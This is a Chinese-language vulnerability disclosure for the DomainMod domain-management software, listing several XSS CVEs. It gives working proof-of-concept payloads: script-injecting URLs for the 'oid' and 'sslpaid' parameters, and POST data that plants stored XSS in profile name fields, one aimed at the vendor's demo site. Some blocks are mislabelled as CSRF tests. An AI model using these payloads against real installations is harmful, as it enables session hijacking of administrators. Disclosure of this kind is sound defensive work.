### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|DomainMod的XSS|2018-05-24|longer/套哥（taoge@5ecurity.cn）|[https://github.com/domainmod/domainmod](https://github.com/domainmod/domainmod) | [https://github.com/domainmod/domainmod](https://github.com/domainmod/domainmod) |4.09.03/4.10.0| [CVE-2018-11403](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403)/[CVE-2018-11403](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403)/[CVE-2018-11404](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11404)/[CVE-2018-11558](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11558)/[CVE-2018-11559](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11559)|  

#### 漏洞概述  

> DomainMod v4.09.03版本和v4.10.0版本 存在XSS的页面  


### POC实现代码如下：  

> DomainMod v4.09.03版本的“assets/edit/account-owner.php”页面的“oid”参数存在一个XSS漏洞，当用户登陆后访问url`http://127.0.0.1/assets/edit/account-owner.php?del=1&oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E`，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/63)告知作者。

>CSRF测试页面代码如下：  
``` html
http://127.0.0.1/assets/edit/account-owner.php?del=1&oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E
```
> DomainMod v4.09.03版本的“assets/edit/ssl-provider-account.php”页面的“sslpaid”参数存在一个XSS漏洞，当用户登陆后访问url`http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E`，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/63)告知作者。

>CSRF测试页面代码如下：  
``` html
http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E
```
> DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_first_name”参数过滤不严格导致存在一个XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/66)告知作者。

>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  
``` raw
post url https://demo.domainmod.org/settings/profile/
post data:new_first_name=test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&new_last_name=test&new_email_address=test%40test.com&new_currency=USD&new_timezone=Canada%2FPacific&new_expiration_emails=0
```
> DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_last_name”参数过滤不严格导致存在一个存储型XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/66)告知作者。

>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  
``` raw
post url https://demo.domainmod.org/settings/profile/
post data:new_first_name=test&new_last_name=test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&new_email_address=test%40test.com&new_currency=USD&new_timezone=Canada%2FPacific&new_expiration_emails=0
```
